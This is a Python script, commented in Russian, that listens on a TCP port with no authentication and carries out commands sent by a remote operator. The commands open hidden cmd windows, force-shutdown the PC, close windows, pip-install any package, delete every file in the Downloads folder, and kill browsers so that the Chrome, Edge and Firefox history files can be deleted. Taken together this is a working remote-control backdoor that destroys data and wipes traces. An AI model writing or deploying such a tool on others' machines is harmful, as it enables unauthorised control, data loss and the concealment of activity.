import socket
import subprocess
import os
import sys
import pygetwindow as gw  # Для работы с окнами
import shutil
import platform
import psutil  # Для работы с процессами

# Устанавливаем IP-адрес и порт сервера
server_ip = '0.0.0.0'  # Это адрес для прослушивания всех входящих соединений
server_port = 5000

# Функция для завершения процессов браузеров
def close_browser_processes():
    browsers = ["chrome.exe", "msedge.exe", "firefox.exe"]
    for browser in browsers:
        for proc in psutil.process_iter(['pid', 'name']):
            if browser.lower() in proc.info['name'].lower():
                try:
                    proc.terminate()  # Завершаем процесс браузера
                    print(f"{browser} завершен.")
                except psutil.NoSuchProcess:
                    pass

# Функция для выполнения команд на клиенте
def execute_command(command):
    if command == 'open_notepad':
        subprocess.Popen(['notepad.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
        print('Блокнот открыт.')

    elif command == 'close_notepad':
        os.system('taskkill /im notepad.exe /f')
        print('Блокнот закрыт.')

    elif command == 'open_cmd':
        subprocess.Popen(['cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
        print('Командная строка открыта.')

    elif command == 'close_cmd':
        os.system('taskkill /im cmd.exe /f')
        print('Командная строка закрыта.')

    elif command == 'shutdown':
        print('Выключение ПК...')
        os.system('shutdown /s /f /t 0')  # Команда для выключения ПК
        sys.exit()  # Завершаем программу после выключения ПК

    elif command == 'show_windows':
        windows = gw.getWindowsWithTitle('')
        active_windows = [window.title for window in windows if window.isVisible()]
        print("\nОткрытые окна:")
        for idx, window in enumerate(active_windows, 1):
            print(f"{idx}. {window}")
        windows_info = '\n'.join(active_windows)
        return windows_info

    elif command.startswith('close_window'):
        try:
            _, n = command.split(" ")
            n = int(n)
            windows = gw.getWindowsWithTitle('')
            active_windows = [window.title for window in windows if window.isVisible()]
            if 1 <= n <= len(active_windows):
                window = windows[n - 1]
                window.close()  # Закрываем выбранное окно
                print(f"Окно {active_windows[n - 1]} закрыто.")
            else:
                print("Неверный номер окна.")
        except Exception as e:
            print(f"Ошибка при закрытии окна: {e}")

    elif command.startswith('install_module'):
        try:
            _, module_name = command.split(" ")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module_name])
            print(f"Модуль {module_name} успешно установлен.")
        except Exception as e:
            print(f"Ошибка при установке модуля: {e}")

    elif command == 'clear_downloads':
        # Очистка папки загрузок
        user_profile = os.environ.get('USERPROFILE', '')  # Получаем путь к профилю пользователя
        downloads_folder = os.path.join(user_profile, 'Downloads')  # Путь к папке загрузок
        if os.path.exists(downloads_folder):
            for filename in os.listdir(downloads_folder):
                file_path = os.path.join(downloads_folder, filename)
                if os.path.isfile(file_path):
                    os.remove(file_path)
            print("Папка 'Загрузки' очищена.")
        else:
            print("Папка 'Загрузки' не найдена.")

    elif command == 'clear_browser_history':
        # Очистка истории браузеров (Chrome, Edge, Firefox)
        system = platform.system()

        if system == "Windows":
            try:
                # Завершаем браузеры перед очисткой
                close_browser_processes()

                # Очистка истории Google Chrome
                chrome_history_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'History')
                if os.path.exists(chrome_history_path):
                    os.remove(chrome_history_path)
                    print("История Google Chrome очищена.")

                # Очистка истории Microsoft Edge
                edge_history_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
                if os.path.exists(edge_history_path):
                    os.remove(edge_history_path)
                    print("История Microsoft Edge очищена.")

                # Очистка истории Firefox
                firefox_profile_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
                for folder in os.listdir(firefox_profile_path):
                    profile_folder = os.path.join(firefox_profile_path, folder, 'places.sqlite')
                    if os.path.exists(profile_folder):
                        os.remove(profile_folder)
                        print("История Mozilla Firefox очищена.")
            except Exception as e:
                print(f"Ошибка при очистке истории браузеров: {e}")

    else:
        print(f'Неверная команда: {command}. Ожидаю следующую команду...')

# Создаем сокет для прослушивания соединений
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((server_ip, server_port))
        s.listen(1)
        print(f'Ожидание соединения на {server_ip}:{server_port}...')
        
        # Принимаем подключение
        conn, addr = s.accept()
        with conn:
            print(f'Подключено к {addr}')
            
            while True:
                command = conn.recv(1024).decode()
                if not command:
                    break
                
                print(f'Получена команда: {command}')
                windows_info = execute_command(command)

                if command == 'show_windows':
                    conn.send(windows_info.encode())  # Отправляем список окон назад на сервер
